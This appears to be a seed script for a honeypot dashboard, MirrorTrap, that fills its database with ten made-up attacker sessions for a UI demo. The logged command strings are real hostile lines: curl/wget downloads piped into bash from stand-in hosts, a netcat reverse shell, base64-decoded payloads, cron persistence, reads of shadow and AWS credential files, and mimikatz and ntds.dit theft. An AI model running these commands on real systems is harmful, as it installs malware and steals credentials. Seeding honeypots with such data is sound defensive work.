"""
seed.py — populate the MirrorTrap DB with realistic test data for UI demo.
Run once: py -3 seed.py
"""
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

from mirrortrap.app import create_app
from mirrortrap.core.logger import log_attack, upsert_session, log_command, log_victim

app = create_app()
db = app.config['DATABASE_URI']

# ── Attacker 1: Low-skill brute forcer (Eastern Europe) ──────────────────────
upsert_session('sess-atk001', '185.220.101.42', 'root', 'password123', success=False, db_uri=db)
log_command('sess-atk001', 'uname -a', db_uri=db)
log_command('sess-atk001', 'id', db_uri=db)
log_command('sess-atk001', 'cat /etc/passwd', db_uri=db)
log_command('sess-atk001', 'wget http://malware.example.com/bot.sh -O /tmp/bot.sh', db_uri=db)
log_command('sess-atk001', 'chmod +x /tmp/bot.sh && /tmp/bot.sh', db_uri=db)
log_attack('185.220.101.42', 'HTTP', 'deploy_script_scan', payload={'path': '/.env'}, db_uri=db)
log_attack('185.220.101.42', 'HTTP', 'env_exposure_scan', payload={'path': '/config'}, db_uri=db)
log_victim('sess-atk001', 'Linux SSH Server', target_account='root',
           attack_vector='brute_force',
           data_accessed='System root access attempt — /etc/passwd, /etc/shadow scanned',
           severity='medium', db_uri=db)

# ── Attacker 2: Credential hunter / Auth breach ───────────────────────────────
upsert_session('sess-atk002', '91.108.4.211', 'admin', 'admin', success=True, db_uri=db)
log_command('sess-atk002', 'cat ~/.aws/credentials', db_uri=db)
log_command('sess-atk002', 'find / -name "*.env" 2>/dev/null', db_uri=db)
log_command('sess-atk002', 'cat /etc/shadow', db_uri=db)
log_command('sess-atk002', 'env | grep -i key', db_uri=db)
log_command('sess-atk002', 'ps aux', db_uri=db)
log_command('sess-atk002', 'netstat -tlnp', db_uri=db)
log_command('sess-atk002', 'curl -s http://91.108.4.211/exfil.sh | bash', db_uri=db)
log_attack('91.108.4.211', 'HTTP', 'aws_credentials_scan', payload={'path': '/.aws/credentials'}, db_uri=db)
log_attack('91.108.4.211', 'HTTP', 'env_exposure_scan', payload={'path': '/.env'}, db_uri=db)
log_victim('sess-atk002', 'AWS Console', target_account='admin@corp-infra.io',
           attack_vector='credential_stuffing',
           data_accessed='AWS credentials (~/.aws/credentials), .env secrets, shadow file',
           severity='critical', db_uri=db)

# ── Attacker 3: Ransomware staging ────────────────────────────────────────────
upsert_session('sess-atk003', '45.142.212.100', 'ubuntu', 'ubuntu', success=False, db_uri=db)
log_command('sess-atk003', 'curl -s http://45.142.212.100/ransom.elf -o /tmp/.x', db_uri=db)
log_command('sess-atk003', 'chmod 777 /tmp/.x && /tmp/.x &', db_uri=db)
log_command('sess-atk003', 'crontab -l', db_uri=db)
log_command('sess-atk003', '(crontab -l; echo "@reboot /tmp/.x") | crontab -', db_uri=db)
log_command('sess-atk003', 'find / -name "*.bak" -delete 2>/dev/null', db_uri=db)
log_attack('45.142.212.100', 'HTTP', 'phpmyadmin_scan', payload={'path': '/phpmyadmin'}, db_uri=db)
log_attack('45.142.212.100', 'HTTP', 'wordpress_scan', payload={'path': '/wp-login.php'}, db_uri=db)
log_victim('sess-atk003', 'WordPress Site', target_account='webmaster@targetsite.com',
           attack_vector='ransomware_deployment',
           data_accessed='Site files targeted for encryption — crontab persistence added',
           severity='critical', db_uri=db)

# ── Attacker 4: Crypto-miner dropper ──────────────────────────────────────────
upsert_session('sess-atk004', '103.55.38.201', 'pi', 'raspberry', success=True, db_uri=db)
log_command('sess-atk004', 'whoami', db_uri=db)
log_command('sess-atk004', 'curl -fsSL http://xmrig.example.com/miner.sh | bash', db_uri=db)
log_command('sess-atk004', 'nohup ./xmrig -o pool.hashvault.pro:443 -u WALLET --tls &', db_uri=db)
log_command('sess-atk004', 'echo "*/5 * * * * /root/.miner/xmrig" >> /etc/crontab', db_uri=db)
log_command('sess-atk004', 'top -bn1 | head -20', db_uri=db)
log_attack('103.55.38.201', 'HTTP', 'env_exposure_scan', payload={'path': '/.env'}, db_uri=db)
log_attack('103.55.38.201', 'HTTP', 'deploy_script_scan', payload={'path': '/deploy.sh'}, db_uri=db)
log_victim('sess-atk004', 'Raspberry Pi SSH', target_account='pi@raspberrypi.local',
           attack_vector='default_credentials',
           data_accessed='Crypto mining payload deployed — pool.hashvault.pro, WALLET key exposed',
           severity='high', db_uri=db)

# ── Attacker 5: Tor-exit node port scanner ────────────────────────────────────
upsert_session('sess-atk005', '178.128.23.11', 'test', '1234', success=False, db_uri=db)
log_command('sess-atk005', 'nmap -sV -p 22,80,443,3306,5432 10.0.0.0/24', db_uri=db)
log_command('sess-atk005', 'masscan --rate=5000 -p80,8080,8443 192.168.0.0/16', db_uri=db)
log_command('sess-atk005', 'echo test', db_uri=db)
log_attack('178.128.23.11', 'HTTP', 'env_exposure_scan', payload={'path': '/.env'}, db_uri=db)
log_attack('178.128.23.11', 'HTTP', 'aws_credentials_scan', payload={'path': '/.aws/credentials'}, db_uri=db)
log_attack('178.128.23.11', 'HTTP', 'wordpress_scan', payload={'path': '/wp-login.php'}, db_uri=db)
log_victim('sess-atk005', 'Internal Network (192.168.0.0/16)', target_account=None,
           attack_vector='network_reconnaissance',
           data_accessed='Port scan of 22, 80, 443, 3306, 5432 — live hosts enumerated',
           severity='low', db_uri=db)

# ── Attacker 6: SQL injection / web app attacker ──────────────────────────────
upsert_session('sess-atk006', '5.188.86.172', 'guest', 'guest', success=False, db_uri=db)
log_command('sess-atk006', "sqlmap -u 'http://target/login.php?id=1' --dbs", db_uri=db)
log_command('sess-atk006', "curl -X POST http://target/login -d \"user=' OR 1=1--&pass=x\"", db_uri=db)
log_command('sess-atk006', 'python3 exploit.py --target 10.0.0.1 --payload reverse_shell', db_uri=db)
log_attack('5.188.86.172', 'HTTP', 'sql_injection_scan', payload={'path': '/login.php?id=1'}, db_uri=db)
log_attack('5.188.86.172', 'HTTP', 'phpmyadmin_scan', payload={'path': '/phpmyadmin/setup'}, db_uri=db)
log_attack('5.188.86.172', 'HTTP', 'wordpress_scan', payload={'path': '/xmlrpc.php'}, db_uri=db)
log_victim('sess-atk006', 'PHP Web Application', target_account='db_user@target-app.com',
           attack_vector='sql_injection',
           data_accessed='Database dumped via sqlmap — all tables exposed',
           severity='high', db_uri=db)

# ── Attacker 7: Advanced persistent threat (nation-state style) ───────────────
upsert_session('sess-atk007', '162.55.196.130', 'syslog', 'Str0ngP@ss!', success=True, db_uri=db)
log_command('sess-atk007', 'ss -tlnp', db_uri=db)
log_command('sess-atk007', 'cat /proc/version', db_uri=db)
log_command('sess-atk007', 'ip route', db_uri=db)
log_command('sess-atk007', 'find /var /etc /home -mtime -1 2>/dev/null | head -40', db_uri=db)
log_command('sess-atk007', 'iptables -L -n', db_uri=db)
log_command('sess-atk007', 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"', db_uri=db)
log_command('sess-atk007', 'base64 -d /tmp/.payload | bash', db_uri=db)
log_command('sess-atk007', 'eval $(echo L2Jpbi9iYXNo | base64 -d)', db_uri=db)
log_command('sess-atk007', 'mkfifo /tmp/pipes && cat /tmp/pipes | /bin/sh 2>&1 | nc 162.55.196.130 4444 > /tmp/pipes', db_uri=db)
log_attack('162.55.196.130', 'HTTP', 'lfi_path_traversal', payload={'path': '../../../etc/passwd'}, db_uri=db)
log_attack('162.55.196.130', 'HTTP', 'rce_exploit', payload={'path': '/cgi-bin/test.cgi'}, db_uri=db)
log_victim('sess-atk007', 'Corporate Internal Network', target_account='syslog@corp-internal.net',
           attack_vector='apt_lateral_movement',
           data_accessed='Reverse shell established — iptables rules, routing tables, /proc data exfiltrated',
           severity='critical', db_uri=db)

# ── Attacker 8: WordPress / CMS mass exploiter ────────────────────────────────
upsert_session('sess-atk008', '80.211.206.105', 'wordpress', 'wordpress', success=False, db_uri=db)
log_command('sess-atk008', 'wpscan --url http://target/ --enumerate p,u', db_uri=db)
log_command('sess-atk008', 'wpscan --url http://target/ -P /usr/share/wordlists/rockyou.txt', db_uri=db)
log_attack('80.211.206.105', 'HTTP', 'wordpress_scan', payload={'path': '/wp-login.php'}, db_uri=db)
log_attack('80.211.206.105', 'HTTP', 'phpmyadmin_scan', payload={'path': '/pma'}, db_uri=db)
log_attack('80.211.206.105', 'HTTP', 'xmlrpc_exploit', payload={'path': '/xmlrpc.php'}, db_uri=db)
log_attack('80.211.206.105', 'HTTP', 'env_exposure_scan', payload={'path': '/wp-config.php.bak'}, db_uri=db)
log_victim('sess-atk008', 'WordPress CMS', target_account='admin@blog-target.com',
           attack_vector='cms_exploitation',
           data_accessed='wp-login.php brute forced — wp-config.php.bak, xmlrpc.php targeted',
           severity='high', db_uri=db)

# ── Attacker 9: Lateral movement / insider threat ────────────────────────────
upsert_session('sess-atk009', '192.168.10.55', 'jdoe', 'Summer2024!', success=True, db_uri=db)
log_command('sess-atk009', 'whoami /priv', db_uri=db)
log_command('sess-atk009', 'net user /domain', db_uri=db)
log_command('sess-atk009', 'net group "Domain Admins" /domain', db_uri=db)
log_command('sess-atk009', 'mimikatz.exe privilege::debug sekurlsa::logonpasswords exit', db_uri=db)
log_command('sess-atk009', 'psexec \\\\DC01 cmd', db_uri=db)
log_command('sess-atk009', 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS', db_uri=db)
log_command('sess-atk009', 'copy C:\\Windows\\NTDS\\ntds.dit \\\\attacker\\share\\', db_uri=db)
log_attack('192.168.10.55', 'HTTP', 'credential_stuffing', payload={'path': '/admin/login'}, db_uri=db)
log_attack('192.168.10.55', 'HTTP', 'lfi_path_traversal', payload={'path': '/../../../windows/system32'}, db_uri=db)
log_victim('sess-atk009', 'Active Directory (DC01)', target_account='jdoe@corp.local',
           attack_vector='lateral_movement',
           data_accessed='NTDS.dit copied — Domain Admin hashes, Mimikatz logon passwords dumped',
           severity='critical', db_uri=db)

# ── Attacker 10: Botnet C2 / DDoS prep ───────────────────────────────────────
upsert_session('sess-atk010', '77.247.108.222', 'oracle', 'oracle', success=False, db_uri=db)
log_command('sess-atk010', 'curl http://c2.botnet.example/register.sh | sh', db_uri=db)
log_command('sess-atk010', 'echo "*/2 * * * * curl http://c2.botnet.example/cmd | sh" | crontab -', db_uri=db)
log_command('sess-atk010', 'kill -9 $(cat /tmp/.pid)', db_uri=db)
log_command('sess-atk010', 'nohup python3 -c "import socket,subprocess,os;s=socket.socket()..." &', db_uri=db)
log_attack('77.247.108.222', 'HTTP', 'env_exposure_scan', payload={'path': '/.env'}, db_uri=db)
log_attack('77.247.108.222', 'HTTP', 'deploy_script_scan', payload={'path': '/setup.php'}, db_uri=db)
log_attack('77.247.108.222', 'HTTP', 'rce_exploit', payload={'path': '/shell.php?cmd=id'}, db_uri=db)
log_victim('sess-atk010', 'C2 Botnet Infrastructure', target_account='oracle@host-server.net',
           attack_vector='botnet_c2',
           data_accessed='Host registered as bot — C2 commands issued every 2 min via cron',
           severity='high', db_uri=db)

# ── Summary ────────────────────────────────────────────────────────────────────
print("✓ Seeded 10 attacker sessions + 10 victim records into", db)
print("  Attacker 1  → 185.220.101.42  (brute forcer)")
print("  Attacker 2  → 91.108.4.211   (credential hunter — AUTH BREACH)")
print("  Attacker 3  → 45.142.212.100 (ransomware staging)")
print("  Attacker 4  → 103.55.38.201  (crypto-miner — AUTH BREACH)")
print("  Attacker 5  → 178.128.23.11  (port scanner / Tor exit)")
print("  Attacker 6  → 5.188.86.172   (SQL injection)")
print("  Attacker 7  → 162.55.196.130 (APT / nation-state — AUTH BREACH)")
print("  Attacker 8  → 80.211.206.105 (WordPress mass exploiter)")
print("  Attacker 9  → 192.168.10.55  (lateral movement — AUTH BREACH)")
print("  Attacker 10 → 77.247.108.222 (botnet C2)")
